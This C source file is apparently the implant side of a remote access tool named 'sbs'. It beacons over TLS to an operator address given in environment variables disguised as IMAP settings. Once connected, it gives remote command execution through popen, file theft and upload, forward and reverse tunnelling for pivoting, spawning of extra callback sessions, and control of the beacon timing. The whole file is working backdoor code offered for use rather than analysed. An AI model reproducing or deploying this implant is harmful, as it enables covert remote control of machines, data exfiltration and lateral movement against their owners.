#include "server.h"

/** 
 * Spin up a new child daemon that immediately beacons out to the indicated address
 * and port. When the primary client abandons the sessions all sub sessions will be killed.
 * On socket errors the server will revert to beaconing behavior.
 * 
 * Note: Currently the method in which we kick off the binary relies on the name of the binary
 * being 'sbs' and this binary being in the path. The binary must also be on disk in order to 
 * kick off. Future versions may offer variations on how to establish a new connection.
 */
int newconn(SSL *ssl, pid_t *pids) {
  FILE *fp;
  pid_t pid;
  char *env;
  char *pidstr;
  char port[7];
  char addr[INET6_ADDRSTRLEN];
  uint8_t buf[4096] = {0};

  if (ssl_writeall(ssl, (uint8_t *)"100", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"102", 4) < 0) {return FAIL;}

  pid = fork();
  if (pid == -1) {
    if (ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
  } else if (pid == 0) {
    setenv("IMAP_SERVER", addr, 1);
    setenv("IMAP_PORT", port, 1);
    env = getenv("PATH");
    strncpy((char *)buf, env, sizeof(buf)-1);
    sprintf((char *)buf + strlen((char *)buf), ":.");
    setenv("PATH", (char *)buf, 1);
    execlp("sbs", "sbs", (char*)NULL);
  } else {
    memset(buf, 0, sizeof(buf));
    fp = popen("pidof sbs", "r");
    fgets((char *)buf, sizeof(buf), fp);
    pidstr = strtok((char *)buf, " ");
    if (ssl_writeall(ssl, (uint8_t *)pidstr, 16) < 0) {
      // Do nothing so that we can still get the pids
    }
    for (size_t i = 0; i < 64; i++) {
      if (pids[i] == 0) {
        pids[i] = atoi(pidstr);
        break;
      }
    }
  }

  return SUCCESS;
}

/**
 * Current implementation opens a 'shell' by running a command via popen and then
 * returning the results. Future version will allow the user to have access to a pty
 * enabling interactive commands such as vim and top to be run on the target machine.
 * On socket errors the program will revert to beaconing behavior.
 */
int cmdshell(SSL *ssl) {
  FILE *fp;
  uint8_t buf[4096] = {0};

  fp = popen("date", "r");
  while (fgets((char *)buf, sizeof(buf), fp) != NULL) {
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {
      pclose(fp);
      return FAIL;
    }
  }
  pclose(fp);

  memset(buf, 0, sizeof(buf));
  while(ssl_readall(ssl, buf, sizeof(buf)) > 0) {
    fp = NULL;
    if (strcmp((char *)buf, "exit\n") == 0) {
      return RECOVER;
    }

    if ((fp = popen((char *)buf, "r")) == NULL) {
      if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
      continue;
    }

    while(1) {
      if (fgets((char *)buf, sizeof(buf), fp) == NULL && strlen((char *)buf) == 0) {
        if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
        break;
      }
      if (ssl_writeall(ssl, (uint8_t *)"102", 4) < 0) {return FAIL;}
      if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

      memset(buf, 0, sizeof(buf));
    }

    memset(buf, 0, sizeof(buf));
    pclose(fp);
  }
  
  return SUCCESS;
}

/**
 * Sends a file from the server to the requesting client.
 * On ssl socket errors the program will revert to beaconing behavior.
 */
int getfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t readin = 0;
  struct stat st;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"300", 4) < 0) {return FAIL;}

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Ensure we can open the file that is being asked for
  if((fd = fopen((char *)buf, "r")) == NULL) {
    if (ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
    return RECOVER;
  }

  // Get the file size and then rewind to the begining of the file
  fstat(fileno(fd), &st);
  filesize = st.st_size;
  sprintf((char *)ans, "%ld", filesize);
  if (ssl_writeall(ssl, ans, sizeof(ans)) < 0) {goto failure;}

  // Send the file
  while(readin < (size_t)filesize) {
    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, sizeof(buf), fd);
    readin += strlen((char *)buf);
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
  }

  fclose(fd);
  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Recieve a file from the client.
 * On ssl socket errors the program will revert to beaconing behavior.
 */
int putfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t written = 0;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"400", 4) < 0) {return FAIL;}

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Ensure we can open the file that is being asked for
  if((fd = fopen((char *)buf, "a")) == NULL) {
    if(ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
    return RECOVER;
  }

  if (ssl_writeall(ssl, (uint8_t *)"401", 4) < 0) {goto failure;}

  // Recieve the filesize from the client
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {goto failure;}
  filesize = atoi((char *)ans);
  if (filesize < 1) {
    return RECOVER;
  };

  // Download the file
  while(written < (size_t)filesize) {
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
    fprintf(fd, "%s", buf);
    written += strlen((char *)buf);
    memset(buf, 0, sizeof(buf));
  }
  fclose(fd);

  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Determine what the client wants to setup -- either a forward or reverse tunnel.
 * The server will remain in this mode until the client indicates that the user has 
 * shutdown the tunnel, or it detects a read/write error on either of the sockets. In the 
 * event of a socket error while in the loop the server will revert to its beaconing behavior.
 */
int tunnel(SSL *ssl) {
  int efd;
  uint8_t ans[4] = {0};

  // Set the epoll file descriptor
  if ((efd = epoll_create1(0)) < 0) {
    if (ssl_writeall(ssl, (uint8_t *)"530", 4) < 0) {return FAIL;}
    return FAIL;
  }

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"500", 4) < 0) {return FAIL;}

  // Determine if the client wants to setup a forward or reverse tunnel
  if (ssl_readall(ssl, ans, 3) < 0) {return FAIL;}

  // First branch is a forward tunnel
  if (strcmp((char *)ans, "51") == 0) { 
    return forward_tunnel(ssl, efd);
  }
  // Second branch is a reverse tunnel 
  else if (strcmp((char *)ans, "52") == 0) {
    return reverse_tunnel(ssl, efd);
  } 
  // We should not hit this but if we do send an error message and recover back to waiting for a new command
  else { 
    if (ssl_writeall(ssl, (uint8_t *)"535", 4) < 0) {return FAIL;}
    return RECOVER;
  }

  // We shouldn't make it here naturally so attempt to recover
  return RECOVER;
}

/**
 * Setup a forward tunnel when called from the tunnel function. The server will connect out to the 
 * specified target address and port when the client indicates it has recieved a connection and tunnel
 * traffic to the end destination.
 * The server will remain in the forward tunnel mode until the client indicates that the user has
 * shutdown the tunnel, or it detects a read/write error on either of the sockets. In the event of 
 * a socket error while in the loop the server will revert to its beaconing behavior.
 */
int forward_tunnel(SSL *ssl, int efd) {
  int sfd;
  int res;
  int r;
  int n, max = 128;
  int ssl_fd = SSL_get_fd(ssl);
  uint8_t ans[16] = {0};
  uint8_t buf[4096] = {0};
  char port[7];
  char addr[INET6_ADDRSTRLEN];
  struct epoll_event event;
  struct epoll_event *events;

  // Buffer for the events to be tracked
  if ((events = calloc(max, sizeof(event))) == NULL) {
    if (ssl_writeall(ssl, (uint8_t *)"531", 4) < 0) {return FAIL;}
    return FAIL;
  }

  // Tell the client that we are about to setup a forward tunnel
  if (ssl_writeall(ssl, (uint8_t *)"510", 4) < 0) {return FAIL;}

  // Read in the target address and port from the client.
  if (ssl_readall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}

  // Register the default descriptor to track - ssl in this case
  event.data.fd = ssl_fd;
  event.events = EPOLLIN | EPOLLET;
  if (epoll_ctl(efd, EPOLL_CTL_ADD, ssl_fd, &event) == -1) {return FAIL;}

  // Enter into the forward tunnel loop
  while(1) {
    // Wait for events 
    n = epoll_wait(efd, events, max, -1);
    
    // Loop over the alerts
    for (int i = 0; i < n; i++) {
      if (events[i].events & EPOLLERR || events[i].events & EPOLLHUP || (!events[i].events & EPOLLIN)) {
        close(events[i].data.fd);
        return FAIL;
      } 
      // This branch handles outoing data from the client desting for the target
      else if (ssl_fd == events[i].data.fd) { 
        // Check to see the state of the socket on the client side 1) new, 2) connected, 3) shutdown.
        memset(ans, 0, sizeof(ans));
        if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
        // This branch handles new connections
        if (strcmp((char *)ans, "511") == 0) { 
          // Connect to the target address and register/add the resulting fd to the event list          
          if (resolveandconnect(&sfd, (int8_t *)&addr, atoi(port)) != SUCCESS) {return FAIL;}
          memset(&event, 0, sizeof(event));
          event.data.fd = sfd;
          event.events = EPOLLIN | EPOLLET;
          if (epoll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) == -1) {return FAIL;}
        } 
        // This branch handles established connections
        else if (strcmp((char *)ans, "512") == 0) {
          // Clear the buffers.
          memset(buf, 0, sizeof(buf));
          memset(ans, 0, sizeof(ans));
          // Check the size of the incoming message
          if (ssl_readall(ssl, buf, sizeof(ans)) < 0) {return FAIL;}
          res = atoi((char *)buf);
          // Read the size of the message into the buffer and echo to the target
          memset(buf, 0, sizeof(buf));
          if (ssl_readall(ssl, buf, res) < 0) {return FAIL;}
          if (writeall(sfd, buf, res) < 0) {continue;}
        } 
        // This branch handles shutting down connections
        else if (strcmp((char *)ans, "513") == 0) {
          // Remove the fd for the connected socket and close down the fd indicated. 
          close(sfd);
          continue;
        } 
        // This branch handles shutting down the entire tunnel 
        else if (strcmp((char *)ans, "514") == 0) { 
          close(sfd);
          free(events);              
          return SUCCESS;
        } 
        // This branch should not be reached. Fail, and resume beaconing.
        else { 
          return FAIL;
        }
      }
      // This branch handles incoming data from the tunnel target 
      else if (sfd == events[i].data.fd) {
        // Clear the buffers
        memset(buf, 0, sizeof(buf));
        memset(ans, 0, sizeof(ans));
        // Read the size of the message
        r = read(sfd, buf, sizeof(buf));
        sprintf((char *)ans, "%d", r);
        // Echo the target messages back to the client.
        ssl_writeall(ssl, ans, sizeof(ans));
        ssl_writeall(ssl, buf, (size_t)r);
      } 
      // We should never hit this branch but if we do just see if we can carry on.
      else {  
        continue;   
      } // Done checking specific event
    } // Done checking updated events
  } // Loop for forward tunnel
}

/**
 * Setup a reverse tunnel when called from the tunnel function. The server will open a listner and wait
 * for connections. Upon recieving a connection it will alert the client to make a connection to the target
 * address and port and facilitate tunneling traffic to the end destination.
 * The server will remain in the forward tunnel mode until the client indicates that the user has
 * shutdown the tunnel, or it detects a read/write error on either of the sockets. In the event of 
 * a socket error while in the loop the server will revert to its beaconing behavior.
 */
int reverse_tunnel(SSL *ssl, int efd) {
  int res;
  int len;
  int sport;
  int sfd, ffd;
  int keepcnt = 5;
  int keepidle = 30; 
  int keepintvl = 30;
  int keepalive = 1;
  int n, max = 128;
  int ssl_fd = SSL_get_fd(ssl);
  uint8_t port[7] = {0};
  uint8_t tarport[7] = {0};
  uint8_t ans[16] = {0};
  uint8_t buf[4096] = {0};
  char taraddr[INET6_ADDRSTRLEN];
  struct timeval timeout;      
  struct epoll_event event;
  struct epoll_event *events;
  struct sockaddr_storage peer;   
  struct sockaddr_storage target;       
  socklen_t socklen = sizeof(target);     
  socklen_t peerlen;                      

  // Buffer for the events to be tracked
  if ((events = calloc(max, sizeof(event))) == NULL) {
    if (ssl_writeall(ssl, (uint8_t *)"531", 4) < 0) {return FAIL;}
    return FAIL;
  }

  // Tell the client that we are about to setup a forward tunnel
  if (ssl_writeall(ssl, (uint8_t *)"520", 4) < 0) {return FAIL;}

  // Read the listening port into memory
  if (ssl_readall(ssl, (uint8_t *)port, 7) < 0) {return FAIL;}

  // Setup the listner
  if (setuplistener(atoi((char *)port), &sfd) != SUCCESS) {return FAIL;}

  // Register the default descriptor to track - ssl in this case
  event.data.fd = sfd;
  event.events = EPOLLIN | EPOLLET;
  if (epoll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) == -1) {return FAIL;}

  // Add the event to the event queue - client socket
  memset(&event, 0, sizeof(event));
  event.data.fd = ssl_fd;
  event.events = EPOLLIN | EPOLLET;
  if (epoll_ctl(efd, EPOLL_CTL_ADD, ssl_fd, &event) == -1) {goto loop_fail;}

  // Enter into the reverse tunnel loop
  while(1) {
    // Wait for events 
    n = epoll_wait(efd, events, max, -1);

    // Loop over the alerts
    for (int i = 0; i < n; i++) {
      if (events[i].events & EPOLLERR || events[i].events & EPOLLHUP || (!events[i].events & EPOLLIN)) {
        close(events[i].data.fd);
        return FAIL;
      } 
      // This branch handles inbound connections
      else if (sfd == events[i].data.fd) { 
        // Accept the connection
        if ((ffd = accept(sfd, (struct sockaddr *)&target, &socklen)) < 0) {goto loop_fail;}
        
        // Set keepalives
        if (setsockopt(ffd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {goto loop_fail;}

        // Set socket timeout values
        timeout.tv_sec = 0;
        timeout.tv_usec = 250;
        if (setsockopt(ffd, SOL_SOCKET, SO_RCVTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, SOL_SOCKET, SO_SNDTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}

        // Put the socket into non-blocking mode
        if (fcntl(ffd, F_SETFL, O_NONBLOCK) < 0) {goto loop_fail;}

        // Get who we are speaking to
        peerlen = sizeof(peer);
        getpeername(ffd, (struct sockaddr*)&peer, &peerlen);
        if (peer.ss_family == AF_INET) {
          struct sockaddr_in *p = (struct sockaddr_in *)&peer;
          sport = ntohs(p->sin_port);
          inet_ntop(AF_INET, &p->sin_addr, taraddr, sizeof(taraddr));
        } else { // AF_INET6
          struct sockaddr_in6 *p = (struct sockaddr_in6 *)&peer;
          sport = ntohs(p->sin6_port);
          inet_ntop(AF_INET6, &p->sin6_addr, taraddr, sizeof(taraddr));
        } 

        // Add the event to the event queue - connected socket
        memset(&event, 0, sizeof(event));
        event.data.fd = ffd;
        event.events = EPOLLIN | EPOLLET;
        if (epoll_ctl(efd, EPOLL_CTL_ADD, ffd, &event) == -1) {goto loop_fail;}

        // Let the client know we recieved a connection
        if (ssl_writeall(ssl, (uint8_t *)"521", 4) < 0) {goto loop_fail;}
        if (ssl_writeall(ssl, (uint8_t *)taraddr, sizeof(taraddr)) < 0) {goto loop_fail;}
        sprintf((char *)tarport, "%d", sport);
        if (ssl_writeall(ssl, (uint8_t *)tarport, sizeof(tarport)) < 0) {goto loop_fail;}
      }
      // This branch handles incoming data the remote target
      else if (ffd == events[i].data.fd) {
        // Clear the buffers
        memset(buf, 0, sizeof(buf));
        memset(ans, 0, sizeof(ans));
        // Read the size of the message
        res = read(ffd, buf, sizeof(buf));
        if (res < 0) {
          if (errno != EAGAIN || errno != EWOULDBLOCK) {
            goto loop_fail;
          }
          continue;
        } else if (res == 0) {
          ssl_writeall(ssl, (uint8_t *)"523", 4);
          close(ffd);
          continue;
        }
        // Tell the client we are still connected
        if (ssl_writeall(ssl, (uint8_t *)"522", 4) < 0) {goto loop_fail;}
        // Tell the client to expect the following size packet
        sprintf((char *)ans, "%d", res);
        if (ssl_writeall(ssl, (uint8_t *)ans, sizeof(ans)) < 0) {goto loop_fail;}
        // Deliver the message
        if (ssl_writeall(ssl, buf, res) < 0) {goto loop_fail;}
      }
      // This branch handles incoming data the local target
      else if (ssl_fd) {
        // Clear the buffers
        memset(buf, 0, sizeof(buf));
        memset(ans, 0, sizeof(ans));
        // Read into memory the size of message
        if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {goto loop_fail;}
        if (strcmp((char *)ans, "E514") == 0) {
          close(ffd);
          close(sfd);
          free(events);              
          return SUCCESS;
        }
        len = atoi((char *)ans);
        // Echo the messages from the target back to our connected socket
        if (ssl_readall(ssl, buf, len) < 0) {goto loop_fail;}
        if (writeall(ffd, buf, len) < 0) {goto loop_fail;}
      }
      // We should never hit this branch but if we do just see if we can carry on.
      else {  
        continue;   
      } // Done checking specific event
    } // Done checking updated events
  } // Loop for reverse tunnel

  loop_fail:
  if (ffd > 0) {
    close(ffd);
  }
  if (sfd > 0) {
    close(sfd);
  }
  free(events);
  return FAIL;
}

/**
 * Set the time to sleep between each beacon the server will send. On error revert to the
 * beaconing behavior that was previously set.
 */
int winset(SSL *ssl, int *time) {
  uint8_t ans[256] = {0};

  if (ssl_writeall(ssl, (uint8_t *)"600", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)ans, sizeof(ans)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"601", 4) < 0) {return FAIL;}

  *time = atoi((char *)ans);

  return SUCCESS;
}

/**
 * Establish the ssl session with the client, and 'authenticate' the client.
 * Then wait for commands to be issued from the client and enter their respective functions.
 * On errors from functions revert back to beaconing behavior. 
 */
int entersession(SSL *ssl, int *clientfd, int *time) {
  int res;
  int cmd;
  int conn;
  int count = 0;
  pid_t pids[64];
  pid_t servpid;
  uint8_t buf[4096] = {0};

  // initialize the pids
  for (size_t i = 0; i < 64; i++) {
    pids[i] = 0;
  }

  // Attach the socket descriptor to the SSL conneciton state
  SSL_set_fd(ssl, *clientfd);                         
  while((conn = SSL_connect(ssl)) <= 0) {
    switch(SSL_get_error(ssl, conn)) {
      case SSL_ERROR_WANT_READ:
      case SSL_ERROR_WANT_WRITE:
        break;
    }
  }

  // Make sure we are gtg with non blocking mode
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
  SSL_set_mode(ssl, SSL_MODE_ENABLE_PARTIAL_WRITE);
  SSL_set_mode(ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);

  // Message the client that we are ready to authenticate
  if (ssl_writeall(ssl, (uint8_t *)"10", 3) < 0) {return FAIL;}          

  // Read the authentication secret into memory
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Keep checking to see if the sent auth message is gtg
  while (strncmp((char *)buf, AUTH, strlen(AUTH) != 0) && count < 3) {       
    if (ssl_writeall(ssl, (uint8_t *)"50", 3) < 0) {return FAIL;}
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
    count++;
  }
  if (ssl_writeall(ssl, (uint8_t *)"10", 3) < 0) {return FAIL;}

  while(1) {
    // Wait for the client to tell me to do something
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, 2) < 0) {
      res = FAIL;
      goto check_exit;
    }
    cmd = atoi((char *)buf);

    // Run the specified command
    switch (cmd) {
      case NEW:
        res = newconn(ssl, pids);
        break;
      case CMD:
        res = cmdshell(ssl);
        break;
      case GET:
        res = getfile(ssl);
        break;
      case PUT:
        res = putfile(ssl);
        break;
      case TUN:
        res = tunnel(ssl);
        break;
      case WIN:
        res = winset(ssl, time);
        break;
      case BYE:
        res = EXIT;
      default:
        break;
    }
    check_exit:
    if (res < 0) {
      servpid = getpid();
      for (size_t i = 0; i < 64; i++){
        if (pids[i] != servpid && pids[i] != 0) {
          kill(pids[i], SIGKILL);
        }
      }
      return res;
    }
  }

  return EXIT;
}

/**
 * Helper function to ensure the entire buffer gets read during non-blocking SSL_reads.
 */
ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len) {
    int r = 0;
    size_t recvd = 0;

    while (recvd < len) {
      r = SSL_read(ssl, &buf[recvd], len-recvd);
      if (r <= 0) {
        if (SSL_get_error(ssl, r) == SSL_ERROR_WANT_READ) {
          continue;
        }
        return FAIL;
      }
      recvd += r;
    }
    return r;
}

/**
 * Helper function to ensure the entire buffer gets read during non-blocking SSL_writes.
 */
ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len) {
  int s = 0;
  size_t sent = 0;

  while (sent < len) {
    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) <= 0) {
      if (SSL_get_error(ssl, s) == SSL_ERROR_WANT_WRITE) {
        continue;
      }
      return FAIL;
    }
    sent += s;
  }

  return s;
}

/**
 * Helper function to ensure the entire buffer is read from a traditional fd socket
 */
ssize_t readall(int fd, uint8_t *buf, size_t len) {
  ssize_t r = 0;
  size_t readin = 0;

  while(readin < len) {
    if ((r = read(fd, &buf[readin], len-readin)) <= 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        continue;
      }
      break;
    }
    readin += r;
  }

  return r;
}

/**
 * Helper function to ensure the entire buffer is written to a traditional fd socket
 */
ssize_t writeall(int fd, uint8_t *buf, size_t len) {
  ssize_t w = 0;
  size_t written = 0;
  
  while(written < len) {
    if ((w = write(fd, &buf[written], len-written)) <= 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        continue;
      }
      break;
    }
    written += w;
  }

  return w;
}

/**
 * Resolve and connect an address and port connection. Setup socket timeouts and keepalives as well.
 * Ensure that the resulting socket is set to non-blocking mode.
 */
int resolveandconnect(int *sockfd, int8_t *addr, int port) {
  int keepcnt = 5;
  int keepidle = 30; 
  int keepintvl = 30;
  int keepalive = 1;
  int connected = 0;
  char portstr[6];
  struct addrinfo hints, *serveraddr, *p;
  struct timeval timeout;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;

  snprintf(portstr, 6,"%d", port);

  if (getaddrinfo((char *)addr, portstr, &hints, &serveraddr) != 0) {return FAIL;}

  for(p = serveraddr; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if (((*sockfd) = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      continue;
    }

    if (connect((*sockfd), p->ai_addr, p->ai_addrlen) < 0) {
      continue;         
    }
    connected = 1;
    break;
  }

  freeaddrinfo(serveraddr);  // All done with the struct at this point

  if (connected == 0) {return FAIL;}

  // Set socket timeout
  timeout.tv_sec = 30;
  timeout.tv_usec = 0;
  if (setsockopt(*sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {return FAIL;}

  // Set keepalives
  if (setsockopt(*sockfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {return FAIL;}

  if (fcntl(*sockfd, F_SETFL, O_NONBLOCK) < 0) {return -1;}

  return SUCCESS;
}

/**
 * Set up a listening socket on a specified port
 */
int setuplistener(int port, int *sockfd) {
  int status;
  int optval = 1;
  char portstr[6];
  struct addrinfo hints, *servinfo, *p;

  // Populate the hints for the following getaddrinfo()
  memset(&hints, 0, sizeof hints);    // Ensure the struct is empty
  hints.ai_family = AF_UNSPEC;        // Indiferent to IPv4 or IPv6
  hints.ai_socktype = SOCK_STREAM;    // TCP stream socket
  hints.ai_flags = AI_PASSIVE;        // Populate the IP for me

  // Get a string version of the port to bind to
  snprintf(portstr, 6,"%d", port);

  // Get address info
  if ((status = getaddrinfo(NULL, portstr, &hints, &servinfo)) != 0) {
    return FAIL;
  };

  // Loop through all returned interfaces and bind to the first viable one
  for(p = servinfo; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if ((*sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      continue;
    }

    // Attempt to set socket to reuseaddr
    if (setsockopt(*sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int)) == -1) {
      return FAIL;
    }

    // Bind to the specified port using the socket
    if (bind(*sockfd, p->ai_addr, p->ai_addrlen) == -1) {
      close(*sockfd);
      continue;
    }
    break;
  }

  freeaddrinfo(servinfo);  // All done with the struct at this point

  // Report errors if we are unable to bind
  if (p == NULL) {
    return FAIL;
  }

  // Attempt to listen
  if (listen(*sockfd, 2) == -1) {
    return FAIL;
  }

  // The socket is now listening and ready to be utilized
  return SUCCESS; 
}

/**
 * Helping function to intialize SSL helper libraries and establish contexts
 */
SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_client_method();       // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

/**
 * The main program logic. Kicks off a daemon that reads the address, and port it should be calling
 * from the environment variables. The auth secret, and time are set by default. Auth is defined in the 
 * header for the server, whereas time is a variable in the funciton below. To properly start the server
 * run the following:
 * 
 * IMAP_SERVER=127.0.0.1 IMAP_PORT=993 PATH=$PATH:. sbs
 */
int main(void) {
  const char* addr;
  const char* port;
  int clientfd;
  int time = 5;
  SSL *ssl;
  SSL_CTX *ctx;

  //daemon(0,0);

  addr = getenv("IMAP_SERVER");
  port = getenv("IMAP_PORT");

  if (addr == NULL || port == NULL) {return FAIL;}

  while (1) {
    // Create new SSL connection state
    SSL_library_init();
    ctx = initCTX();
    ssl = SSL_new(ctx);                             

    // Connect to the client and then set the SSL fd to the socket
    if (resolveandconnect(&clientfd, (int8_t *)addr, atoi((char *)port)) != SUCCESS) {
      goto reset;
    }
    
    // Enter the session
    entersession(ssl, &clientfd, &time);                    

    // Clean up the SSL context and close the socket
    SSL_free(ssl);                                  
    close(clientfd);                                
    SSL_CTX_free(ctx);                              

    // Sleep for a set amount of time and then start up again 
    reset:
    sleep(time);                                    
  }

  return SUCCESS;
}